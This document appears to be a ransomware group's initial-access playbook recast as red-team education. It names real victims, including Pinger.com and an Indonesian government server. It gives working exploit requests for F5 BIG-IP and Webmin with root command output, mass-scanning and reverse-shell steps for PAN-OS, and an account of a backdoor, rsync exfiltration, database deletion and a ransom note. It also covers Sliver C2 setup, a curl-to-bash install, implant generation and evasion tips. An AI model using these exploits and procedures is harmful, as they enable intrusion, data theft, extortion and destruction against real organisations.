# HELLCAT Practical Initial Access Guide for Red Teams
This guide is a modified version of an original playbook exclusively used by the HELLCAT ransomware group. The original material was written from an offensive, threat actor perspective, detailing real-world attack methodologies.

This version has been restructured for ethical red team education, with all techniques presented strictly for security research purposes. It covers the full attack lifecycle: reconnaissance, exploitation, C2 infrastructure, lateral movement, persistence, evasion techniques, and includes real-world case studies (including walkthroughs of the Pinger.com and Indonesian government breaches).

Important: All content is provided for educational use only. Unauthorized penetration testing is illegal.

## Table of Contents  
1. Resources  
2. Walkthroughs (Including the Pinger.com Breach)  
3. Case Study: Indonesian Government Ransomware Attack 
4. C2 Infrastructure Setup  
5. Persistence Techniques  
6. Targeted Attack Methodologies  
7. Network Pivoting Fundamentals  
8. Operational Security: Reducing Footprint  
9. Command Cheat Sheet 

## 1. Resources

### CVE Databases:
- MITRE CVE Database  
- National Vulnerability Database (NVD)  
- Exploit Database (Exploit-DB)  

### Security News Platforms:
- Search LinkedIn for 'rce cve'  
- Follow sites like:  
  - BleepingComputer  
  - ThreatPost  
  - The Hacker News  
- Newsletters:  
  - Cybersecurity Insiders  
  - DarkReading  

### Vendor Security Advisories:
- Monitor advisories from:  
  - Microsoft  
  - Cisco  
  - Adobe  
  - Other major vendors  

### Tools:
#### Find New CVEs:
- LinkedIn  
- YouTube ("CVE")  
- Google ("rce cve")  

#### Find Vulnerable Hosts:
- en.fofa.info (3000 free credits per new account - use new Tor circuit and a disposible email from Guerilla Mail)  
- leakix.net  
- shodan.io  
- censys.io  

#### Find Exploit Scripts:
- github.com  
- sploitus.com  
- 0day.today  

### Researching Proof-of-Concept (PoC) Exploits:
#### Platforms:
- GitHub repositories (search "PoC CVE-xxxx-xxxx")  
- Exploit-DB (use advanced search)  
- Packet Storm Security  

#### Evaluating PoCs:
- **Authenticity**: Verify through trusted platforms/community feedback  
- **Replicability**: Test in controlled, isolated environment  
- **Complexity**: Analyze prerequisites (privileges/configurations)  

#### Key Tools:
- Metasploit Framework (exploit testing)  
- Python/scripting knowledge (for PoC modification)  

## 2. Walkthroughs 

**Note:** I'll give you all the tools I used in these walkthroughs. If you can't find something, message me and I'll help you out.

### Walkthrough 1: How We Got Initial Access to Pinger.com

Let me walk you through exactly how we got into Pinger.com step-by-step. Here's what we accomplished:
- Triggered building security alarms
- Printed ransom notes on their printers
- Shut down power to their server room
- Stole their source code
- Encrypted their data

#### Step-by-Step Breakdown:

1. **Finding the Exploit**
   - I was looking for exploits being used in real attacks and found CVE-2022-1388
   - Searched for it on sploitus.com and found a Proof of Concept (PoC)
     - Remember: Not all PoCs are complete exploits!
   - Followed the source link to GitHub:  
     https://github.com/alt3kx/CVE-2022-1388

2. **Testing the Exploit**
   - Now we have two options:
     1. Test it safely on a local VM first (recommended)
     2. Go straight to finding vulnerable hosts (riskier)

3. **Finding Vulnerable Targets**
   - This vendor (F5 Big-IP) has special filters:
     - Censys.io has them but version detection is hard
     - leakix.net works much better for this case
   - Try different search engines to see what works best:
     - fofa
     - shodan
     - leakix
     - censys
   - Good leakix search query:  
     https://leakix.net/search?scope=leak&q=%2Bplugin%3A%22BigIPVersion%22  
     (This shows all vulnerable F5 Big-IP hosts)

4. **Executing the Exploit**
   - The PoC uses a POST request - perfect for BurpSuite
   - Here's the exact request we used:
     ```http
     POST /mgmt/tm/util/bash HTTP/1.1
     Host: 207.140.30.115
     Authorization: Basic YWRtaW46
     Connection: keep-alive, X-F5-Auth-Token
     X-F5-Auth-Token: 0
     Content-Length: 100

     {"command": "run", "utilCmdArgs": " -c 'id' "}
     ```
   - Here's how we did it:
     1. Opened BurpSuite
     2. Sent a normal GET request to the Repeater
     3. Changed it to the POST request above
     4. Hit send

5. **Confirming We Got In**
   - The server responded with:
     ```json
     {
       "kind": "tm:util:bash:runstate",
       "command": "run",
       "utilCmdArgs": " -c 'id' ",
       "commandResult": "uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\n"
     }
     ```
   - Boom! We have root access (RCE).

6. **What We Did After Getting In**
   - Set up SSH port forwarding (port 8081)
   - Compromised multiple Jenkins servers
   - Accessed terabytes of data including:
     - Plain text chat logs
     - Usernames and passwords
     - System logs
     - Complete source code
   - Fun fact: Pinger owns TextFree - the biggest free phone number app in North America!

### Walkthrough 2: PAN-OS Exploit Chain

For this walkthrough, we'll use a fresh N-day vulnerability:

### Vulnerability Details
**CVE-2024-0012**  
PAN-OS Authentication Bypass → Remote Code Execution

**Step 1: Locate the Exploit**
1. Searched sploitus.com for the CVE
2. Found working PoC at:  
   [github.com/TalatumLabs/CVE-2024-0012_CVE-2024-9474_PoC](https://github.com/TalatumLabs/CVE-2024-0012_CVE-2024-9474_PoC)

**Step 2: Find Vulnerable Targets**
1. Create account on [en.fofa.info](https://en.fofa.info)
2. Search `"PanOS"`  
3. Filter results by:  
   - Title = "Login" (shows exposed firewalls/VPNS)
   - Country/port filters (optional)
4. Export results

**Step 3: Format Target List**
Convert results to this format (use AI or scripting):
```
https://1.1.1.1:4443/
https://2.2.2.2:443/
https://3.3.3.3:4443/
https://4.4.4.4:443/
```
Save as `ips.txt`

**Step 4: Mass Vulnerability Check**
Run the checker:  
```bash
python3 checker.py ips.txt --no-verify >> out.txt 2>&1
```

Monitor progress in second terminal:  
```bash
tail -f out.txt
```

After completion, extract vulnerable hosts:  
```bash
cat out.txt | grep 'is vuln'
```

**Step 5: Exploitation**
Execute the PoC against vulnerable targets:  
```bash
python3 poc.py target_url
```
**Result:** Reverse shell obtained

## Case Study: Indonesian Government Ransomware Attack

**Target:** [bppkad.blorakab.go.id](https://bppkad.blorakab.go.id/)

### Vulnerability Details
- **CVE-2019-15107** in Webmin
- *Custom Python checker available (DM for script)*
- Webmin 1.890 contained backdoor allowing root command execution
- Versions 1.900-1.920 required:
  - Enabled password change feature at:  
    `Webmin -> Webmin Configuration -> Authentication`

### Proof of Concept
```http
POST /password_change.cgi HTTP/1.1
Host: 10.11.1.88:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: http://10.11.1.88:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

expired=id
```

### Attack Execution

**1. Backdoor Installation**
- Added Perl backdoor to `/var/www/html` for persistent access
- Verified via listener before proceeding

**2. Target Recon**
- Disk usage analysis:
  ```
  145G    /
  111G    /home
  110G    /home/backup-db/efinance
  110G    /home/backup-db
  51G     /home/backup-db/efinance/2021
  34G     /home/backup-db/efinance/2019
  29G     /var
  27G     /var/databases/firebird
  27G     /var/databases
  24G     /home/backup-db/efinance/2020
  ```
- Key discoveries:
  1. Primary database server
  2. Backups stored on production systems
  3. Firebird DBMS in use

**3. Data Exfiltration**
- Cracked Firebird default credentials
- Mounted attacker NAS
- Exfiltrated via `rsync`

**4. Ransom Deployment**
- Executed `rm -rf` on production databases
- Left ransom note:
  ```bash
  └─# ssh -i ./indgov root@180.214.248.20 -p 2222
  Linux bppkad-dbserver 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64
  IMPORTANT!!! IMPORTANT!!! IMPORTANT!!! IMPORTANT!!! IMPORTANT!!!
  
  Your files have been ENCRYPTED AND STOLEN by the HELLCAT Ransomware Group.
  View the note to see how to get your data.
  'HOW TO GET YOUR DATA.txt' in every main directory.
  ```
- Immediate effect: Site showed database connection errors

### Outcome
- **14+ days downtime** at time of writing  
- Data successfully monetized

## C2 Infrastructure Setup

### Sliver C2 Framework Setup

**1. Server Requirements**
- Recommended: VPS (I use [4vps.su](https://4vps.su))
  
**2. Installation**
```bash
curl https://sliver.sh/install | sudo bash
```
Then start Sliver:
```bash
sliver
```

**3. Basic Configuration**
- Client connects to local server by default
- Create new operators:
  ```bash
  sliver > new-operator
  ```
- For external servers: Edit configuration file

### Generating Implants
**Windows payload:**
```bash
sliver > generate --mtls 192.168.1.10 --os windows
```

**Linux payload:**
```bash
sliver > generate --mtls 192.168.1.10 --os linux
```

### Listeners Setup
**MTLS listener:**
```bash
sliver > listener mtls --host 192.168.1.10
```

**HTTPS listener:**
```bash
sliver > listener https --host 192.168.1.10
```

### Operational Security
- **Domain Fronting:** Use compromised legitimate domains
- **Encryption:** Always use HTTPS/mTLS
- **Rotation:** Regularly change infrastructure

### Implant Types
| Feature        | Beacons                     | Implants                  |
|---------------|----------------------------|--------------------------|
| Activity      | Low-noise, asynchronous     | Constant connection       |
| Detection Risk | Low                        | Higher                   |
| Flexibility   | Modular, dynamic commands  | Predefined functionality |
| Use Case      | Stealthy operations        | Immediate interaction    |

**Key Differences:**
- **Beacons:** 
  - Lightweight callbacks
  - On-demand tasking
  - Better for evasion

- **Implants:**
  - Persistent connection
  - Faster response
  - Easier to detect
